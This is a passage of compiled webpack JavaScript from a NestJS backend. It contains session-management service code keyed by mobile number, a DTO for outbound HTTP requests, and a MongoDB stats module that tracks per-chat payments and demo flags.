                await this.updateAuditOnSuccess(mobile, auditResult.session, sessions_schema_1.SessionCreationMethod.OLD_SESSION);
                return auditResult;
            }
            else {
                this.logger.info(mobile, `Audit sessions failed: ${auditResult.error}`);
            }
            const finalError = 'All session creation strategies failed: old session, existing manager, and audit sessions';
            (0, utils_1.parseError)(finalError);
            return {
                success: false,
                error: finalError,
                retryable: false
            };
        }
        catch (error) {
            (0, utils_1.parseError)(error);
            return {
                success: false,
                error: error.message || 'Unexpected error',
                retryable: false
            };
        }
    }
    async tryAuditSessions(mobile, options) {
        try {
            const auditSessions = await this.sessionAuditService.getSessionsFormobile(mobile, true);
            if (!auditSessions || auditSessions.length === 0) {
                return { success: false, error: 'No audit sessions found', retryable: false };
            }
            for (let i = 0; i < Math.min(auditSessions.length, 2); i++) {
                const auditSession = auditSessions[i];
                try {
                    const result = await this.sessionManager.createSession({
                        ...options,
                        oldSession: auditSession.sessionString,
                        maxRetries: 1
                    });
                    if (result.success) {
                        return result;
                    }
                }
                catch (error) {
                    this.logger.error(mobile, `Audit session ${i + 1} failed`, error);
                }
            }
            return { success: false, error: 'All audit sessions failed', retryable: false };
        }
        catch (error) {
            return { success: false, error: 'Failed to process audit sessions', retryable: false };
        }
    }
    async updateAuditOnSuccess(mobile, sessionString, creationMethod) {
        try {
            await this.sessionAuditService.createAuditRecord({
                mobile,
                sessionString,
                creationMethod,
                creationMessage: 'Session created successfully'
            });
        }
        catch (error) {
            this.logger.error(mobile, 'Failed to create new audit record on success', error);
        }
    }
    async getSessionAuditHistory(mobile, options) {
        try {
            const result = await this.sessionAuditService.querySessionAudits({
                mobile,
                limit: options?.limit,
                offset: options?.offset,
                status: options?.status
            });
            return { success: true, data: result.sessions, total: result.total };
        }
        catch (error) {
            return { success: false, error: error.message || 'Failed to get audit history' };
        }
    }
    async getActiveSession(mobile) {
        try {
            const activeSession = await this.sessionAuditService.getLatestActiveSession(mobile);
            return { success: true, session: activeSession || undefined };
        }
        catch (error) {
            return { success: false, error: error.message || 'Failed to get active session' };
        }
    }
    async updateSessionLastUsed(mobile, sessionString) {
        try {
            const result = await this.sessionAuditService.markSessionUsed(mobile, sessionString);
            if (result) {
                this.logger.info(mobile, 'Session last used timestamp updated');
                return { success: true };
            }
            else {
                return { success: false, error: 'No active session found to update' };
            }
        }
        catch (error) {
            return { success: false, error: error.message || 'Failed to update session last used timestamp' };
        }
    }
    async findRecentValidSession(mobile) {
        try {
            if (!mobile || typeof mobile !== 'string') {
                return { success: false, error: 'Invalid mobile number provided' };
            }
            const recentSessions = await this.sessionAuditService.findRecentSessions(mobile);
            this.logger.debug(mobile, `Found ${recentSessions?.length || 0} recent sessions for this month`);
            if (!recentSessions || recentSessions.length === 0) {
                this.logger.debug(mobile, 'No recent sessions found for this month');
                return { success: false, error: 'No recent sessions found for this month' };
            }
            for (const session of recentSessions) {
                if (session && session.sessionString) {
                    return { success: true, session };
                }
            }
            this.logger.debug(mobile, 'No valid session found from this month');
            return { success: false, error: 'No valid session found from this month' };
        }
        catch (error) {
            this.logger.error(mobile, 'Failed to find valid session from this month', error);
            return { success: false, error: error.message || 'Failed to find valid session from this month' };
        }
    }
    async getOldestSessionOrCreate(options) {
        const { mobile, allowFallback = true, maxAgeDays = 30 } = options;
        try {
            if (!mobile || typeof mobile !== 'string') {
                return {
                    success: false,
                    message: 'Mobile number is required and must be a valid string',
                    code: 'INVALID_MOBILE'
                };
            }
            this.logger.info(mobile, `Starting getOldestSessionOrCreate with maxAge: ${maxAgeDays} days, fallback: ${allowFallback}`);
            const rateLimitCheck = this.checkRateLimit(mobile);
            if (!rateLimitCheck.allowed) {
                const resetTime = new Date(rateLimitCheck.resetTime || 0);
                return {
                    success: false,
                    message: `Rate limit exceeded. Maximum ${this.MAX_SESSIONS_PER_HOUR} requests per hour. Try again after ${resetTime.toISOString()}`,
                    code: 'RATE_LIMIT_EXCEEDED',
                    retryable: true
                };
            }
            const oldestSessionResult = await this.findOldestValidSession(mobile, maxAgeDays);
            if (oldestSessionResult.success && oldestSessionResult.session) {
                this.logger.info(mobile, 'Oldest valid session found, updating usage and returning');
                try {
                    await this.sessionAuditService.markSessionUsed(mobile, oldestSessionResult.session.sessionString);
                }
                catch (updateError) {
                    this.logger.error(mobile, 'Warning: Failed to update session usage', updateError);
                }
                const sessionAge = this.calculateSessionAge(oldestSessionResult.session.createdAt);
                return {
                    success: true,
                    message: 'Oldest valid session retrieved successfully',
                    data: {
                        session: oldestSessionResult.session.sessionString,
                        sessionAge,
                        isNew: false,
                        usageCount: oldestSessionResult.session.usageCount,
                        lastUsedAt: oldestSessionResult.session.lastUsedAt.toISOString(),
                        createdAt: oldestSessionResult.session.createdAt.toISOString()
                    }
                };
            }
            if (!allowFallback) {
                this.logger.info(mobile, 'No valid session found and fallback is disabled');
                return {
                    success: false,
                    message: `No valid session found within ${maxAgeDays} days and fallback creation is disabled`,
                    code: 'FALLBACK_DISABLED'
                };
            }
            this.logger.info(mobile, 'No valid session found, creating new session as fallback');
            const createResult = await this.createSessionWithFallback(mobile);
            if (createResult.success && createResult.session) {
                return {
                    success: true,
                    message: 'No existing session found, new session created as fallback',
                    data: {
                        session: createResult.session,
                        sessionAge: 0,
                        isNew: true,
                        usageCount: 0,
                        lastUsedAt: new Date().toISOString(),
                        createdAt: new Date().toISOString()
                    }
                };
            }
            else {
                this.logger.error(mobile, 'Failed to create fallback session', createResult.error);
                return {
                    success: false,
                    message: `Failed to create fallback session: ${createResult.error}`,
                    code: 'FALLBACK_CREATION_FAILED',
                    retryable: createResult.retryable || false
                };
            }
        }
        catch (error) {
            this.logger.error(mobile, 'Unexpected error in getOldestSessionOrCreate', error);
            return {
                success: false,
                message: 'An unexpected error occurred while processing the request',
                code: 'INTERNAL_ERROR',
                retryable: false
            };
        }
    }
    async findOldestValidSession(mobile, maxAgeDays) {
        try {
            const cutoffDate = new Date();
            cutoffDate.setDate(cutoffDate.getDate() - maxAgeDays);
            this.logger.info(mobile, `Searching for sessions newer than ${cutoffDate.toISOString()}`);
            const sessions = await this.sessionAuditService.querySessionAudits({
                mobile,
                isActive: true,
                startDate: cutoffDate,
                limit: 50,
                offset: 0
            });
            if (!sessions.sessions || sessions.sessions.length === 0) {
                this.logger.info(mobile, 'No sessions found within the specified age limit');
                return { success: false, error: 'No sessions found within age limit' };
            }
            const validSessions = sessions.sessions
                .filter(session => session.sessionString &&
                session.sessionString.trim().length > 0 &&
                (session.status === sessions_schema_1.SessionStatus.ACTIVE || session.status === sessions_schema_1.SessionStatus.CREATED))
                .sort((a, b) => new Date(a.createdAt).getTime() - new Date(b.createdAt).getTime());
            if (validSessions.length === 0) {
                this.logger.info(mobile, 'No valid sessions found (all sessions are invalid or empty)');
                return { success: false, error: 'No valid sessions found' };
            }
            const oldestSession = validSessions[0];
            this.logger.info(mobile, `Found oldest valid session created at ${oldestSession.createdAt}`);
            return { success: true, session: oldestSession };
        }
        catch (error) {
            this.logger.error(mobile, 'Error finding oldest valid session', error);
            return { success: false, error: error.message || 'Failed to find oldest valid session' };
        }
    }
    async createSessionWithFallback(mobile) {
        try {
            return await this.createSession({ mobile });
        }
        catch (error) {
            this.logger.error(mobile, 'Error in createSessionWithFallback', error);
            return {
                success: false,
                error: error.message || 'Failed to create session',
                retryable: false
            };
        }
    }
    calculateSessionAge(createdAt) {
        const now = new Date();
        const sessionDate = new Date(createdAt);
        const diffTime = Math.abs(now.getTime() - sessionDate.getTime());
        const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
        return diffDays;
    }
};
exports.SessionService = SessionService;
exports.SessionService = SessionService = __decorate([
    (0, common_1.Injectable)(),
    __metadata("design:paramtypes", [session_audit_service_1.SessionAuditService])
], SessionService);


/***/ }),

/***/ "./src/components/shared/dto/execute-request.dto.ts":
/*!**********************************************************!*\
  !*** ./src/components/shared/dto/execute-request.dto.ts ***!
  \**********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ExecuteRequestDto = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
var ResponseType;
(function (ResponseType) {
    ResponseType["JSON"] = "json";
    ResponseType["TEXT"] = "text";
    ResponseType["STREAM"] = "stream";
    ResponseType["BLOB"] = "blob";
    ResponseType["DOCUMENT"] = "document";
    ResponseType["ARRAYBUFFER"] = "arraybuffer";
})(ResponseType || (ResponseType = {}));
class ExecuteRequestDto {
}
exports.ExecuteRequestDto = ExecuteRequestDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'The URL to send the request to' }),
    (0, class_validator_1.IsUrl)({}, { message: 'Please provide a valid URL' }),
    __metadata("design:type", String)
], ExecuteRequestDto.prototype, "url", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ enum: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'], default: 'GET' }),
    (0, class_validator_1.IsEnum)(['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], ExecuteRequestDto.prototype, "method", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ type: Object, additionalProperties: { type: "string" } }),
    (0, class_validator_1.IsObject)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Object)
], ExecuteRequestDto.prototype, "headers", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Request body data' }),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Object)
], ExecuteRequestDto.prototype, "data", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ type: Object, additionalProperties: { type: 'string' } }),
    (0, class_validator_1.IsObject)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Object)
], ExecuteRequestDto.prototype, "params", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ enum: ResponseType, default: ResponseType.JSON }),
    (0, class_validator_1.IsEnum)(ResponseType),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], ExecuteRequestDto.prototype, "responseType", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Request timeout in milliseconds', default: 30000, minimum: 1000, maximum: 300000 }),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.Min)(1000),
    (0, class_validator_1.Max)(300000),
    (0, class_validator_1.IsOptional)(),
    (0, class_transformer_1.Transform)(({ value }) => parseInt(value)),
    __metadata("design:type", Number)
], ExecuteRequestDto.prototype, "timeout", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Whether to follow redirects', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_transformer_1.Transform)(({ value }) => value === 'true' || value === true),
    __metadata("design:type", Boolean)
], ExecuteRequestDto.prototype, "followRedirects", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Maximum number of redirects to follow', default: 5, minimum: 0, maximum: 10 }),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.Min)(0),
    (0, class_validator_1.Max)(10),
    (0, class_validator_1.IsOptional)(),
    (0, class_transformer_1.Transform)(({ value }) => parseInt(value)),
    __metadata("design:type", Number)
], ExecuteRequestDto.prototype, "maxRedirects", void 0);


/***/ }),

/***/ "./src/components/stats/create-stat.dto.ts":
/*!*************************************************!*\
  !*** ./src/components/stats/create-stat.dto.ts ***!
  \*************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateStatDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateStatDto {
}
exports.CreateStatDto = CreateStatDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '6785668464', description: 'Chat ID' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 12, description: 'Count' }),
    __metadata("design:type", Number)
], CreateStatDto.prototype, "count", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 50, description: 'Pay Amount' }),
    __metadata("design:type", Number)
], CreateStatDto.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given Today' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "demoGivenToday", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'New User' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "newUser", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Paid Reply' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Amaan Khan', description: 'Name' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Second Show' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: null, description: 'Did Pay' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "didPay", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "client", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Profile' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "profile", void 0);


/***/ }),

/***/ "./src/components/stats/stat.controller.ts":
/*!*************************************************!*\
  !*** ./src/components/stats/stat.controller.ts ***!
  \*************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.StatController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const stat_service_1 = __webpack_require__(/*! ./stat.service */ "./src/components/stats/stat.service.ts");
const create_stat_dto_1 = __webpack_require__(/*! ./create-stat.dto */ "./src/components/stats/create-stat.dto.ts");
const update_stat_dto_1 = __webpack_require__(/*! ./update-stat.dto */ "./src/components/stats/update-stat.dto.ts");
let StatController = class StatController {
    constructor(statService) {
        this.statService = statService;
    }
    async create(createStatDto) {
        return this.statService.create(createStatDto);
    }
    async findByChatIdAndProfile(chatId, profile) {
        return this.statService.findByChatIdAndProfile(chatId, profile);
    }
    async update(chatId, profile, updateStatDto) {
        return this.statService.update(chatId, profile, updateStatDto);
    }
    async deleteOne(chatId, profile) {
        return this.statService.deleteOne(chatId, profile);
    }
    async deleteAll() {
        return this.statService.deleteAll();
    }
};
exports.StatController = StatController;
__decorate([
    (0, common_1.Post)(),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_stat_dto_1.CreateStatDto]),
    __metadata("design:returntype", Promise)
], StatController.prototype, "create", null);
__decorate([
    (0, common_1.Get)(':chatId/:profile'),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Param)('profile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], StatController.prototype, "findByChatIdAndProfile", null);
__decorate([
    (0, common_1.Put)(':chatId/:profile'),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Param)('profile')),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, update_stat_dto_1.UpdateStatDto]),
    __metadata("design:returntype", Promise)
], StatController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':chatId/:profile'),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Param)('profile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], StatController.prototype, "deleteOne", null);
__decorate([
    (0, common_1.Delete)(),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], StatController.prototype, "deleteAll", null);
exports.StatController = StatController = __decorate([
    (0, swagger_1.ApiTags)('stats'),
    (0, common_1.Controller)('stats'),
    __metadata("design:paramtypes", [stat_service_1.StatService])
], StatController);


/***/ }),

/***/ "./src/components/stats/stat.module.ts":
/*!*********************************************!*\
  !*** ./src/components/stats/stat.module.ts ***!
  \*********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.StatModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const stat_service_1 = __webpack_require__(/*! ./stat.service */ "./src/components/stats/stat.service.ts");
const stat_controller_1 = __webpack_require__(/*! ./stat.controller */ "./src/components/stats/stat.controller.ts");
const stat_schema_1 = __webpack_require__(/*! ./stat.schema */ "./src/components/stats/stat.schema.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
let StatModule = class StatModule {
};
exports.StatModule = StatModule;
exports.StatModule = StatModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: "StatsModule", collection: "stats", schema: stat_schema_1.StatSchema }])
        ],
        controllers: [stat_controller_1.StatController],
        providers: [stat_service_1.StatService],
        exports: [stat_service_1.StatService]
    })
], StatModule);


/***/ }),

/***/ "./src/components/stats/stat.schema.ts":
/*!*********************************************!*\
  !*** ./src/components/stats/stat.schema.ts ***!
  \*********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.StatSchema = exports.Stat = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let Stat = class Stat {
};
exports.Stat = Stat;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '6785668464', description: 'Chat ID' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 12, description: 'Count' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], Stat.prototype, "count", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 50, description: 'Pay Amount' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], Stat.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given Today' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat.prototype, "demoGivenToday", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'New User' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat.prototype, "newUser", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Paid Reply' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Amaan Khan', description: 'Name' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Second Show' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: null, description: 'Did Pay' }),
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", Boolean)
], Stat.prototype, "didPay", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat.prototype, "client", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Profile' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat.prototype, "profile", void 0);
exports.Stat = Stat = __decorate([
    (0, mongoose_1.Schema)()
], Stat);
exports.StatSchema = mongoose_1.SchemaFactory.createForClass(Stat);
exports.StatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });


/***/ }),

/***/ "./src/components/stats/stat.service.ts":
/*!**********************************************!*\
  !*** ./src/components/stats/stat.service.ts ***!
  \**********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.StatService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
let StatService = class StatService {
    constructor(statModel) {
        this.statModel = statModel;
    }
    async create(createStatDto) {
        const createdStat = new this.statModel(createStatDto);
        return createdStat.save();
    }
    async findAll() {
        const stats = await this.statModel.find().exec();
        return stats;
    }
    async findByChatIdAndProfile(chatId, profile) {
        const stat = await this.statModel.findOne({ chatId, profile }).exec();
        if (!stat) {
            throw new common_1.NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);
        }
        return stat;
    }
    async update(chatId, profile, updateStatDto) {
        const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();
        if (!stat) {
            throw new common_1.NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);
        }
        return stat;
    }
    async deleteOne(chatId, profile) {
        const result = await this.statModel.deleteOne({ chatId, profile }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);
        }
    }
    async deleteAll() {
        await this.statModel.deleteMany({}).exec();
    }
};
exports.StatService = StatService;
exports.StatService = StatService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)("StatsModule")),
    __metadata("design:paramtypes", [mongoose_2.Model])
], StatService);


/***/ }),

/***/ "./src/components/stats/update-stat.dto.ts":
/*!*************************************************!*\
  !*** ./src/components/stats/update-stat.dto.ts ***!
  \*************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateStatDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_stat_dto_1 = __webpack_require__(/*! ./create-stat.dto */ "./src/components/stats/create-stat.dto.ts");
class UpdateStatDto extends (0, swagger_1.PartialType)(create_stat_dto_1.CreateStatDto) {
}
exports.UpdateStatDto = UpdateStatDto;


/***/ }),

/***/ "./src/components/stats2/create-stat2.dto.ts":
/*!***************************************************!*\
  !*** ./src/components/stats2/create-stat2.dto.ts ***!
  \***************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateStatDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateStatDto {
}
exports.CreateStatDto = CreateStatDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '6785668464', description: 'Chat ID' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 12, description: 'Count' }),
    __metadata("design:type", Number)
], CreateStatDto.prototype, "count", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 50, description: 'Pay Amount' }),
    __metadata("design:type", Number)
], CreateStatDto.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given Today' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "demoGivenToday", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'New User' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "newUser", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Paid Reply' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Amaan Khan', description: 'Name' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "name", void 0);
__decorate([
